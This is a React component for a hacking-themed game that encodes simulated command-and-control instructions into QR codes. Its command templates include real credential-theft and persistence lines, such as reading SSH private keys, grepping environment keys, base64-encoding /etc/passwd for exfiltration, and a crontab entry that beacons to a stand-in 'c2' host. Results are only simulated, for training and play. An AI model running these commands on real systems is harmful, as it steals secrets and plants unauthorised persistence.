import { useState } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useGame } from '@/hooks/useGameSession';
import { Download, Copy, Upload, QrCode, RefreshCw, Zap, Bot, Play, Key, CheckCircle, AlertCircle, Terminal, Radio, Send } from 'lucide-react';

// C2 Command Templates - Inspired by QuickResponseC2
// Stealthy command & control via QR code encoding
const C2_COMMAND_TEMPLATES = [
  { id: 'shell', name: 'Shell Command', template: 'whoami', description: 'Execute shell command on target' },
  { id: 'sysinfo', name: 'System Info', template: 'uname -a && hostname && id', description: 'Gather system information' },
  { id: 'network', name: 'Network Recon', template: 'ip addr && netstat -tuln', description: 'Network configuration' },
  { id: 'files', name: 'File Listing', template: 'ls -la /tmp && find /home -name "*.txt" 2>/dev/null', description: 'List sensitive files' },
  { id: 'env', name: 'Environment', template: 'env | grep -i key', description: 'Extract environment variables' },
  { id: 'processes', name: 'Process List', template: 'ps aux --sort=-%mem | head -20', description: 'Running processes' },
  { id: 'creds', name: 'Credential Hunt', template: 'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"', description: 'Hunt for credentials' },
  { id: 'download', name: 'Exfil File', template: 'base64 /etc/passwd', description: 'Base64 encode file for exfil' },
  { id: 'persist', name: 'Persistence', template: 'echo "* * * * * curl http://c2/beacon" | crontab -', description: 'Install persistence' },
  { id: 'custom', name: 'Custom Command', template: '', description: 'Enter your own command' },
];

// QR Action Templates - Mirror real security tools with game intents
// These match real-world CTF/OSINT patterns for authenticity
const QR_ACTION_PRESETS = [
  { 
    id: 'custom', 
    name: 'Raw Payload', 
    template: '{"type":"raw","data":"BASE64_OR_HEX_DATA","encoding":"base64"}',
    description: 'Raw data injection - mirrors real QR malware payloads'
  },
  { 
    id: 'beacon', 
    name: 'C2 Beacon', 
    template: '{"type":"beacon","callback":"https://c2.sysadmin.corp/check-in","agent_id":"AGENT-001","interval":60}',
    description: 'Command & Control check-in - like real APT beacons'
  },
  { 
    id: 'exfil', 
    name: 'Data Exfiltration', 
    template: '{"type":"exfil","target":"session","fields":["token","clues","username"],"dest":"/api/collect"}',
    description: 'Exfil player data - mirrors real data theft techniques'
  },
  { 
    id: 'inject', 
    name: 'Code Injection', 
    template: '{"type":"inject","payload":"echo $FLAG","shell":"bash","sandbox":true}',
    description: 'Inject terminal command - like real RCE exploits'
  },
  { 
    id: 'phish', 
    name: 'Credential Harvest', 
    template: '{"type":"phish","redirect":"/admin","spoof":"login","capture":["username","password"]}',
    description: 'Redirect to fake login - mirrors real phishing'
  },
  { 
    id: 'dropper', 
    name: 'Payload Dropper', 
    template: '{"type":"dropper","artifact":{"id":"clue-05","name":"Malware Sample","content":"ZXhwbG9pdC5leGU="},"autorun":false}',
    description: 'Drop artifact/clue - like malware droppers'
  },
  { 
    id: 'pivot', 
    name: 'Network Pivot', 
    template: '{"type":"pivot","from":"/terminal","to":"/void","tunnel":"ssh","port":22}',
    description: 'Redirect through routes - mirrors network pivoting'
  },
  { 
    id: 'recon', 
    name: 'Reconnaissance', 
    template: '{"type":"recon","scan":"full","targets":["routes","clues","quests"],"output":"json"}',
    description: 'Enumerate game state - like nmap/recon scans'
  },
  { 
    id: 'persistence', 
    name: 'Persistence Mechanism', 
    template: '{"type":"persist","method":"localstorage","key":"backdoor","value":"ACTIVE","ttl":86400}',
    description: 'Install persistent access - mirrors real persistence'
  },
  { 
    id: 'decrypt', 
    name: 'Crypto Challenge', 
    template: '{"type":"crypto","cipher":"rot13","data":"FRPERG_ZRFFNTR","hint":"Classic cipher"}',
    description: 'Encrypted message - requires decryption to unlock'
  },
];

interface QRCodeModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
  const { gameState, collectClue, importSession } = useGame();
  const [code, setCode] = useState(QR_ACTION_PRESETS[0].template);
  const [selectedPreset, setSelectedPreset] = useState('custom');
  const [qrImage, setQrImage] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [importCode, setImportCode] = useState('');
  const [importResult, setImportResult] = useState<string | null>(null);
  const [agentResult, setAgentResult] = useState<string | null>(null);
  const [sessionInput, setSessionInput] = useState('');
  const [sessionStatus, setSessionStatus] = useState<'idle' | 'success' | 'error'>('idle');
  const [sessionMessage, setSessionMessage] = useState('');
  const [c2Command, setC2Command] = useState('whoami');
  const [c2CommandQR, setC2CommandQR] = useState<string | null>(null);
  const [c2Results, setC2Results] = useState<Array<{ id: number; command: string; result: string; timestamp: string }>>([]);
  const [c2CommandIndex, setC2CommandIndex] = useState(0);
  const [c2SelectedTemplate, setC2SelectedTemplate] = useState('shell');
  const [c2ServerStatus, setC2ServerStatus] = useState<'offline' | 'online' | 'waiting'>('offline');

  const generateQR = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/qr/secret', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          secretId: `custom-${Date.now()}`, 
          hint: code 
        })
      });
      const data = await response.json();
      setQrImage(data.qrCode);
    } catch (error) {
      console.error('Failed to generate QR:', error);
    }
    setLoading(false);
  };

  const exportSession = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/qr/export', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionToken: gameState.sessionToken })
      });
      const data = await response.json();
      setQrImage(data.qrCode);
      setCode(JSON.stringify({
        type: 'session',
        clues: gameState.inventory.length,
        token: gameState.sessionToken.substring(0, 8) + '...'
      }, null, 2));
    } catch (error) {
      console.error('Failed to export session:', error);
    }
    setLoading(false);
  };

  const handleImport = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/qr/decode', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ encoded: importCode })
      });
      const data = await response.json();
      
      if (data.type === 'secret') {
        const secretData = JSON.parse(data.data);
        collectClue({
          id: `qr-${secretData.id}`,
          name: 'QR Fragment',
          description: 'Decoded from a QR signal.',
          content: secretData.hint,
          foundAt: new Date().toISOString()
        });
        setImportResult('SUCCESS: Data fragment extracted and archived.');
      } else if (data.type === 'session') {
        setImportResult('SESSION DATA DETECTED. Merge not implemented in this interface.');
      } else {
        setImportResult(`DECODED: ${JSON.stringify(data)}`);
      }
    } catch (error) {
      setImportResult('ERROR: Invalid or corrupted QR payload.');
    }
    setLoading(false);
  };

  const downloadQR = () => {
    if (!qrImage) return;
    const link = document.createElement('a');
    link.href = qrImage;
    link.download = `qr-${Date.now()}.png`;
    link.click();
  };

  const copyToClipboard = () => {
    if (qrImage) {
      navigator.clipboard.writeText(qrImage);
    }
  };

  const executeViaAgent = async () => {
    setLoading(true);
    setAgentResult(null);
    try {
      const response = await fetch('/api/agent/execute', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          payload: code,
          sessionToken: gameState.sessionToken,
          agentId: 'QR-MODAL-AGENT'
        })
      });
      const data = await response.json();
      setAgentResult(JSON.stringify(data, null, 2));
    } catch (error) {
      setAgentResult('ERROR: Agent execution failed - ' + String(error));
    }
    setLoading(false);
  };

  const copyPayloadForAgent = () => {
    const agentPayload = JSON.stringify({
      endpoint: '/api/agent/execute',
      method: 'POST',
      body: {
        payload: JSON.parse(code),
        sessionToken: 'SESSION_TOKEN_HERE',
        agentId: 'YOUR_AGENT_ID'
      }
    }, null, 2);
    navigator.clipboard.writeText(agentPayload);
  };

  const copySessionToken = () => {
    navigator.clipboard.writeText(gameState.sessionToken);
    setSessionStatus('success');
    setSessionMessage('Token copied to clipboard!');
    setTimeout(() => setSessionStatus('idle'), 2000);
  };

  const handleImportSession = async () => {
    if (!sessionInput.trim()) {
      setSessionStatus('error');
      setSessionMessage('Please enter a session token');
      return;
    }
    
    setLoading(true);
    try {
      const success = await importSession(sessionInput.trim());
      if (success) {
        setSessionStatus('success');
        setSessionMessage('Session imported successfully! Refreshing...');
        setTimeout(() => {
          window.location.reload();
        }, 1500);
      } else {
        setSessionStatus('error');
        setSessionMessage('Invalid session token or session not found');
      }
    } catch (error) {
      setSessionStatus('error');
      setSessionMessage('Failed to import session: ' + String(error));
    }
    setLoading(false);
  };

  const generateC2CommandQR = async () => {
    setLoading(true);
    try {
      const c2Payload = {
        type: 'c2_command',
        id: c2CommandIndex,
        cmd: c2Command,
        encoding: 'base64',
        timestamp: new Date().toISOString()
      };
      const response = await fetch('/api/qr/secret', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          secretId: `c2-cmd-${c2CommandIndex}`, 
          hint: JSON.stringify(c2Payload)
        })
      });
      const data = await response.json();
      setC2CommandQR(data.qrCode);
      setC2CommandIndex(prev => prev + 1);
      setC2ServerStatus('waiting');
    } catch (error) {
      console.error('Failed to generate C2 command QR:', error);
    }
    setLoading(false);
  };

  const simulateC2Result = () => {
    const simulatedResults: Record<string, string> = {
      'whoami': 'nexus-agent',
      'uname -a && hostname && id': 'Linux nexus-host 5.15.0 #1 SMP x86_64 GNU/Linux\\nnexus-host\\nuid=1000(agent) gid=1000(agent)',
      'ip addr && netstat -tuln': 'eth0: 192.168.1.100/24\\nActive connections: 22/tcp, 80/tcp, 443/tcp',
      'ls -la /tmp && find /home -name "*.txt" 2>/dev/null': 'total 16\\ndrwxrwxrwt 2 root root 4096\\n-rw-r--r-- 1 agent agent 156 secrets.txt\\n/home/agent/notes.txt',
      'env | grep -i key': 'API_KEY=sk-redacted...\\nSECRET_KEY=hidden',
      'ps aux --sort=-%mem | head -20': 'USER PID %MEM COMMAND\\nagent 1234 5.2 nexus-agent\\nroot 1 0.1 systemd',
    };
    
    const result = simulatedResults[c2Command] || `Command executed: ${c2Command}\\nOutput: [simulated response]`;
    
    setC2Results(prev => [...prev, {
      id: c2CommandIndex - 1,
      command: c2Command,
      result,
      timestamp: new Date().toISOString()
    }]);
    setC2ServerStatus('online');
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="bg-[#0a0500] border-amber-900/50 text-stone-300 font-mono max-w-2xl">
        <DialogHeader>
          <DialogTitle className="text-amber-600 font-orbitron flex items-center gap-2">
            <QrCode className="w-5 h-5" />
            QR SIGNAL GENERATOR
          </DialogTitle>
          <DialogDescription className="text-stone-500">
            Encode or decode data fragments via QR transmission.
          </DialogDescription>
        </DialogHeader>

        <Tabs defaultValue="generate" className="w-full">
          <TabsList className="bg-amber-950/30 border border-amber-900/30 flex-wrap h-auto">
            <TabsTrigger value="session" className="data-[state=active]:bg-teal-900/50 data-[state=active]:text-teal-400">
              <Key className="w-3 h-3 mr-1" /> Session
            </TabsTrigger>
            <TabsTrigger value="generate" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
              Generate
            </TabsTrigger>
            <TabsTrigger value="export" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
              Export
            </TabsTrigger>
            <TabsTrigger value="agent" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
              <Bot className="w-3 h-3 mr-1" /> Agent
            </TabsTrigger>
            <TabsTrigger value="c2" className="data-[state=active]:bg-red-900/50 data-[state=active]:text-red-400">
              <Radio className="w-3 h-3 mr-1" /> C2
            </TabsTrigger>
            <TabsTrigger value="import" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
              Decode
            </TabsTrigger>
          </TabsList>

          <TabsContent value="session" className="space-y-4 mt-4">
            {/* Current Session Info */}
            <div className="p-4 bg-teal-950/20 rounded border border-teal-900/30">
              <h3 className="text-teal-400 font-bold mb-3 flex items-center gap-2">
                <Key className="w-4 h-4" /> Current Session
              </h3>
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-xs text-stone-500">Token:</span>
                  <code className="text-xs text-teal-400 bg-black/50 px-2 py-1 rounded max-w-[200px] truncate">
                    {gameState.sessionToken}
                  </code>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs text-stone-500">Fragments:</span>
                  <span className="text-xs text-teal-400">{gameState.inventory.length}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs text-stone-500">Username:</span>
                  <span className="text-xs text-teal-400">{gameState.username}</span>
                </div>
              </div>
            </div>

            {/* Copy Token */}
            <Button 
              onClick={copySessionToken}
              className="w-full bg-teal-700 hover:bg-teal-600 text-black font-bold"
              data-testid="copy-session-token"
            >
              <Copy className="w-4 h-4 mr-2" />
              COPY SESSION TOKEN
            </Button>

            {sessionStatus !== 'idle' && (
              <div className={`p-3 rounded border font-mono text-sm flex items-center gap-2 ${
                sessionStatus === 'success'
                  ? 'bg-teal-950/30 border-teal-800/50 text-teal-400' 
                  : 'bg-red-950/30 border-red-800/50 text-red-400'
              }`}>
                {sessionStatus === 'success' ? <CheckCircle className="w-4 h-4" /> : <AlertCircle className="w-4 h-4" />}
                {sessionMessage}
              </div>
            )}

            {/* Import Session */}
            <div className="pt-4 border-t border-stone-800">
              <h4 className="text-sm text-amber-600 font-bold mb-3">Import Existing Session</h4>
              <div className="space-y-3">
                <Input
                  value={sessionInput}
                  onChange={(e) => setSessionInput(e.target.value)}
                  className="bg-black/50 border-amber-900/30 text-amber-500 font-mono"
                  placeholder="Paste session token here..."
                  data-testid="session-input"
                />
                <Button 
                  onClick={handleImportSession}
                  disabled={loading || !sessionInput.trim()}
                  className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
                  data-testid="import-session-btn"
                >
                  <Upload className="w-4 h-4 mr-2" />
                  {loading ? 'IMPORTING...' : 'IMPORT SESSION'}
                </Button>
              </div>
              <p className="text-xs text-stone-600 mt-2">
                Importing a session will replace your current progress with the imported session's data.
              </p>
            </div>
          </TabsContent>

          <TabsContent value="generate" className="space-y-4 mt-4">
            {/* Action Type Selector */}
            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700 flex items-center gap-2">
                <Zap className="w-3 h-3" />
                QR Action Type
              </label>
              <Select 
                value={selectedPreset} 
                onValueChange={(value) => {
                  setSelectedPreset(value);
                  const preset = QR_ACTION_PRESETS.find(p => p.id === value);
                  if (preset) setCode(preset.template);
                }}
              >
                <SelectTrigger className="bg-black/50 border-amber-900/30 text-amber-500">
                  <SelectValue placeholder="Select action type" />
                </SelectTrigger>
                <SelectContent className="bg-[#0a0500] border-amber-900/50">
                  {QR_ACTION_PRESETS.map((preset) => (
                    <SelectItem 
                      key={preset.id} 
                      value={preset.id}
                      className="text-amber-500 focus:bg-amber-900/30 focus:text-amber-400"
                    >
                      {preset.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <p className="text-xs text-stone-600">
                {QR_ACTION_PRESETS.find(p => p.id === selectedPreset)?.description}
              </p>
            </div>

            {/* Editable Payload */}
            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700">
                Payload Code (Edit Below)
              </label>
              <Textarea
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="bg-black/50 border-amber-900/30 text-amber-500 font-mono h-32 resize-none"
                placeholder='{"type":"secret","data":"your_message"}'
              />
              <p className="text-xs text-stone-600">
                Edit the JSON above to customize what this QR code does when scanned.
              </p>
            </div>

            <Button 
              onClick={generateQR} 
              disabled={loading}
              className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
            >
              {loading ? <RefreshCw className="w-4 h-4 animate-spin" /> : 'ENCODE TO QR'}
            </Button>

            {qrImage && (
              <div className="flex flex-col items-center gap-4 p-4 bg-black/30 rounded border border-amber-900/20">
                <img src={qrImage} alt="Generated QR Code" className="w-48 h-48" />
                <div className="flex gap-2">
                  <Button variant="outline" size="sm" onClick={downloadQR} className="border-amber-800 text-amber-600">
                    <Download className="w-4 h-4 mr-2" /> Download
                  </Button>
                  <Button variant="outline" size="sm" onClick={copyToClipboard} className="border-amber-800 text-amber-600">
                    <Copy className="w-4 h-4 mr-2" /> Copy Data URL
                  </Button>
                </div>
                
                {/* Agent Execution Info */}
                <div className="w-full mt-2 p-3 bg-amber-950/20 rounded border border-amber-900/30 text-left">
                  <p className="text-xs text-amber-600 font-bold mb-1">AGENT EXECUTION</p>
                  <p className="text-xs text-stone-500 mb-2">Give this payload to an agent to execute elsewhere:</p>
                  <code className="block text-xs text-amber-500/80 bg-black/50 p-2 rounded overflow-x-auto">
                    POST /api/agent/execute<br/>
                    {`{ "payload": ${code.substring(0, 50)}${code.length > 50 ? '...' : ''} }`}
                  </code>
                </div>
              </div>
            )}
          </TabsContent>

          <TabsContent value="export" className="space-y-4 mt-4">
            <div className="p-4 bg-amber-950/20 rounded border border-amber-900/30">
              <h3 className="text-amber-500 font-bold mb-2">Current Session</h3>
              <p className="text-xs text-stone-500">Token: {gameState.sessionToken.substring(0, 16)}...</p>
              <p className="text-xs text-stone-500">Clues Collected: {gameState.inventory.length}</p>
              <p className="text-xs text-stone-500">Username: {gameState.username}</p>
            </div>

            <Button 
              onClick={exportSession} 
              disabled={loading}
              className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
            >
              {loading ? <RefreshCw className="w-4 h-4 animate-spin" /> : 'EXPORT SESSION AS QR'}
            </Button>

            {qrImage && (
              <div className="flex flex-col items-center gap-4 p-4 bg-black/30 rounded border border-amber-900/20">
                <img src={qrImage} alt="Session QR Code" className="w-48 h-48" />
                <p className="text-xs text-stone-600">Share this QR to transfer your progress</p>
                <Button variant="outline" size="sm" onClick={downloadQR} className="border-amber-800 text-amber-600">
                  <Download className="w-4 h-4 mr-2" /> Download
                </Button>
              </div>
            )}
          </TabsContent>

          <TabsContent value="agent" className="space-y-4 mt-4">
            <div className="p-4 bg-amber-950/20 rounded border border-amber-900/30">
              <h3 className="text-amber-500 font-bold mb-2 flex items-center gap-2">
                <Bot className="w-4 h-4" /> Agent Execution API
              </h3>
              <p className="text-xs text-stone-500 mb-2">
                Execute QR payloads via the agent API. Give the payload to any automated system or AI agent.
              </p>
              <code className="block text-xs text-stone-400 bg-black/50 p-2 rounded">
                POST /api/agent/execute
              </code>
            </div>

            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700">Current Payload</label>
              <Textarea
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="bg-black/50 border-amber-900/30 text-amber-500 font-mono h-24 resize-none text-xs"
              />
            </div>

            <div className="flex gap-2">
              <Button 
                onClick={executeViaAgent} 
                disabled={loading}
                className="flex-1 bg-amber-700 hover:bg-amber-600 text-black font-bold"
              >
                <Play className="w-4 h-4 mr-2" />
                {loading ? 'EXECUTING...' : 'EXECUTE NOW'}
              </Button>
              <Button 
                onClick={copyPayloadForAgent}
                variant="outline"
                className="border-amber-800 text-amber-600"
              >
                <Copy className="w-4 h-4 mr-2" /> Copy for Agent
              </Button>
            </div>

            {agentResult && (
              <div className="p-3 rounded border bg-black/50 border-amber-800/50">
                <p className="text-xs text-amber-600 font-bold mb-1">EXECUTION RESULT</p>
                <pre className="text-xs text-amber-500/80 overflow-x-auto whitespace-pre-wrap max-h-40 overflow-y-auto">
                  {agentResult}
                </pre>
              </div>
            )}

            <div className="p-3 bg-black/30 rounded border border-amber-900/20">
              <p className="text-xs text-amber-700 font-bold mb-2">AVAILABLE ACTION TYPES</p>
              <div className="grid grid-cols-2 gap-1 text-xs text-stone-500">
                <span>• beacon (C2 check-in)</span>
                <span>• exfil (data extraction)</span>
                <span>• inject (code injection)</span>
                <span>• phish (credential harvest)</span>
                <span>• dropper (payload drop)</span>
                <span>• pivot (network pivot)</span>
                <span>• recon (reconnaissance)</span>
                <span>• persist (persistence)</span>
                <span>• crypto (cipher challenge)</span>
                <span>• raw (raw data)</span>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="c2" className="space-y-4 mt-4 max-h-[60vh] overflow-y-auto">
            {/* C2 Overview */}
            <div className="p-4 bg-red-950/20 rounded border border-red-900/30">
              <h3 className="text-red-400 font-bold mb-2 flex items-center gap-2">
                <Radio className="w-4 h-4" /> QuickResponse C2 Framework
              </h3>
              <p className="text-xs text-stone-400 mb-3">
                Inspired by real C2 frameworks, this tool encodes commands into QR codes for stealthy 
                command & control operations. In NEXUS, use this for CTF challenges, campaign missions, 
                and multiplayer stealth objectives.
              </p>
              <div className="flex items-center gap-2">
                <span className={`w-2 h-2 rounded-full ${
                  c2ServerStatus === 'online' ? 'bg-green-500 animate-pulse' : 
                  c2ServerStatus === 'waiting' ? 'bg-yellow-500 animate-pulse' : 'bg-red-500'
                }`} />
                <span className="text-xs text-stone-500">
                  Server: {c2ServerStatus === 'online' ? 'Agent Connected' : 
                          c2ServerStatus === 'waiting' ? 'Awaiting Response' : 'Standby'}
                </span>
              </div>
            </div>

            {/* Command Template Selector */}
            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-red-700 flex items-center gap-2">
                <Terminal className="w-3 h-3" /> Command Template
              </label>
              <Select 
                value={c2SelectedTemplate} 
                onValueChange={(value) => {
                  setC2SelectedTemplate(value);
                  const template = C2_COMMAND_TEMPLATES.find(t => t.id === value);
                  if (template && template.template) setC2Command(template.template);
                }}
              >
                <SelectTrigger className="bg-black/50 border-red-900/30 text-red-500">
                  <SelectValue placeholder="Select command template" />
                </SelectTrigger>
                <SelectContent className="bg-[#0a0500] border-red-900/50">
                  {C2_COMMAND_TEMPLATES.map((template) => (
                    <SelectItem 
                      key={template.id} 
                      value={template.id}
                      className="text-red-500 focus:bg-red-900/30 focus:text-red-400"
                    >
                      {template.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <p className="text-xs text-stone-600">
                {C2_COMMAND_TEMPLATES.find(t => t.id === c2SelectedTemplate)?.description}
              </p>
            </div>

            {/* Command Input */}
            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-red-700">Command to Execute</label>
              <Input
                value={c2Command}
                onChange={(e) => setC2Command(e.target.value)}
                className="bg-black/50 border-red-900/30 text-red-500 font-mono"
                placeholder="Enter shell command..."
                data-testid="c2-command-input"
              />
            </div>

            {/* Generate & Simulate Buttons */}
            <div className="flex gap-2">
              <Button 
                onClick={generateC2CommandQR} 
                disabled={loading || !c2Command}
                className="flex-1 bg-red-700 hover:bg-red-600 text-white font-bold"
                data-testid="generate-c2-qr"
              >
                <QrCode className="w-4 h-4 mr-2" />
                {loading ? 'ENCODING...' : 'ENCODE COMMAND'}
              </Button>
              <Button 
                onClick={simulateC2Result}
                disabled={!c2CommandQR}
                variant="outline"
                className="border-red-800 text-red-600 hover:bg-red-950/30"
                data-testid="simulate-c2-result"
              >
                <Play className="w-4 h-4 mr-2" /> Simulate
              </Button>
            </div>

            {/* Generated QR */}
            {c2CommandQR && (
              <div className="flex flex-col items-center gap-3 p-4 bg-black/30 rounded border border-red-900/20">
                <img src={c2CommandQR} alt="C2 Command QR" className="w-40 h-40" />
                <p className="text-xs text-stone-500">Command #{c2CommandIndex - 1}: {c2Command.substring(0, 30)}...</p>
                <Button variant="outline" size="sm" onClick={() => {
                  if (c2CommandQR) {
                    const link = document.createElement('a');
                    link.href = c2CommandQR;
                    link.download = `c2-cmd-${c2CommandIndex - 1}.png`;
                    link.click();
                  }
                }} className="border-red-800 text-red-600">
                  <Download className="w-4 h-4 mr-2" /> Download
                </Button>
              </div>
            )}

            {/* Results History */}
            {c2Results.length > 0 && (
              <div className="space-y-2">
                <label className="text-xs uppercase tracking-widest text-red-700">Execution History</label>
                <div className="max-h-32 overflow-y-auto space-y-2">
                  {c2Results.slice(-5).reverse().map((result) => (
                    <div key={result.id} className="p-2 bg-black/50 rounded border border-red-900/20 text-xs">
                      <div className="flex justify-between text-stone-500 mb-1">
                        <code className="text-red-400">$ {result.command}</code>
                        <span>{new Date(result.timestamp).toLocaleTimeString()}</span>
                      </div>
                      <pre className="text-stone-400 whitespace-pre-wrap">{result.result}</pre>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Gameplay Integration Guide */}
            <div className="p-4 bg-stone-900/30 rounded border border-stone-800">
              <h4 className="text-amber-500 font-bold mb-3 flex items-center gap-2">
                <Zap className="w-4 h-4" /> Gameplay Integration
              </h4>
              <div className="space-y-3 text-xs text-stone-400">
                <div className="p-2 bg-black/30 rounded">
                  <p className="text-teal-400 font-bold mb-1">Campaign: Shadow Protocol</p>
                  <p>Use C2 QR codes to exfiltrate data from simulated corporate targets. Each successful command reveals clues for the next mission stage.</p>
                </div>
                <div className="p-2 bg-black/30 rounded">
                  <p className="text-purple-400 font-bold mb-1">Multiplayer: Stealth Race</p>
                  <p>Compete to encode/decode C2 commands fastest. First player to extract all target data wins. QR codes add realistic tradecraft.</p>
                </div>
                <div className="p-2 bg-black/30 rounded">
                  <p className="text-amber-400 font-bold mb-1">CTF Challenge: Dead Drop</p>
                  <p>Leave encoded commands as QR "dead drops" for teammates. Decode incoming result QRs to piece together the flag.</p>
                </div>
                <div className="p-2 bg-black/30 rounded">
                  <p className="text-red-400 font-bold mb-1">Training: Red Team Ops</p>
                  <p>Practice encoding recon commands, persistence mechanisms, and data exfil payloads - all skills used by real penetration testers.</p>
                </div>
              </div>
            </div>

            {/* How It Works */}
            <div className="p-3 bg-black/30 rounded border border-stone-800">
              <p className="text-xs text-stone-500 font-bold mb-2">HOW QR C2 WORKS</p>
              <ol className="text-xs text-stone-500 space-y-1 list-decimal list-inside">
                <li>Attacker encodes command → QR code (command.png)</li>
                <li>Target polls server, downloads & decodes QR</li>
                <li>Command executes, result encoded → QR</li>
                <li>Result QR uploaded, attacker decodes response</li>
                <li>All traffic appears as normal image downloads</li>
              </ol>
              <p className="text-xs text-red-400 mt-2 italic">
                * In NEXUS, this is simulated for educational purposes. No real systems are targeted.
              </p>
            </div>
          </TabsContent>

          <TabsContent value="import" className="space-y-4 mt-4">
            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700">Base64 Encoded Payload</label>
              <Input
                value={importCode}
                onChange={(e) => setImportCode(e.target.value)}
                className="bg-black/50 border-amber-900/30 text-amber-500 font-mono"
                placeholder="Paste encoded QR data here..."
              />
            </div>

            <Button 
              onClick={handleImport} 
              disabled={loading || !importCode}
              className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
            >
              <Upload className="w-4 h-4 mr-2" />
              {loading ? 'DECODING...' : 'DECODE & IMPORT'}
            </Button>

            {importResult && (
              <div className={`p-3 rounded border font-mono text-sm ${
                importResult.startsWith('SUCCESS') 
                  ? 'bg-green-950/30 border-green-800/50 text-green-500' 
                  : importResult.startsWith('ERROR')
                    ? 'bg-red-950/30 border-red-800/50 text-red-500'
                    : 'bg-amber-950/30 border-amber-800/50 text-amber-500'
              }`}>
                {importResult}
              </div>
            )}
          </TabsContent>
        </Tabs>
      </DialogContent>
    </Dialog>
  );
};
